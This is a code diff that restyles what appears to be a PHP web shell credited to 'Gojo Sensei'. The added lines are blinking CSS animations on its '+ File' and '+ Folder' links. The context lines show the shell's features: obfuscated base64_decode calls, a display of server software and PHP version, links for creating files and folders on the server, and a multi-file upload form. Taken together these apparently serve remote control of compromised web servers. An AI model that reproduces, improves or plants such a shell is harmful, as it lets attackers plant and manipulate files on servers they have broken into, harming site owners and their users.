@@ -370,7 +370,11 @@ button, input:hover {
 }
 
 .kedip {
-    animation: kedip 1s linear infinite;
+    animation: kedip 2s linear infinite;
+}
+
+.kedip-border {
+    animation: kedip-border 1s linear infinite;
 }
 
 @keyframes kedip {
@@ -384,6 +388,19 @@ button, input:hover {
         color: red;
     }
 }
+
+@keyframes kedip-border {
+    0% {
+        border-color: #4200ac;
+    }
+    50% {
+        border-color: yellow;
+    }
+    100% {
+        border-color: #4200ac;
+    }
+}
+    
 </style>
 <script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
 </head>
@@ -398,7 +415,7 @@ button, input:hover {
         <li>Server Software : <span style="color: red;"><?php echo $_SERVER[base64_decode('U0VSVkVSX1NPRlRXQVJF')]; ?></span></li>
         <li>PHP Version : <span style="color: red;"><?php echo phpversion(); ?></span></li>
         <li>Made By : <span class="kedip">Gojo Sensei</span></li>
-        <li><a href="?p=<?= ss($Jd) . base64_decode('JmE9') . Ss(base64_decode('bmV3RmlsZQ==')) ?>" class="ohct">+ File</a> | <a href="?p=<?= Ss($Jd) . base64_decode('JmE9') . sS(base64_decode('bmV3RGly')) ?>" class="ohct">+ Folder</a></li>
+        <li><a href="?p=<?= ss($Jd) . base64_decode('JmE9') . Ss(base64_decode('bmV3RmlsZQ==')) ?>" class="ohct kedip-border">+ File</a> | <a href="?p=<?= Ss($Jd) . base64_decode('JmE9') . sS(base64_decode('bmV3RGly')) ?>" class="ohct kedip-border">+ Folder</a></li>
         <li>
             <form method="post" enctype="multipart/form-data" style="padding: 0.10rem;display: inline-block;">
     <input type="file" name="files[]">
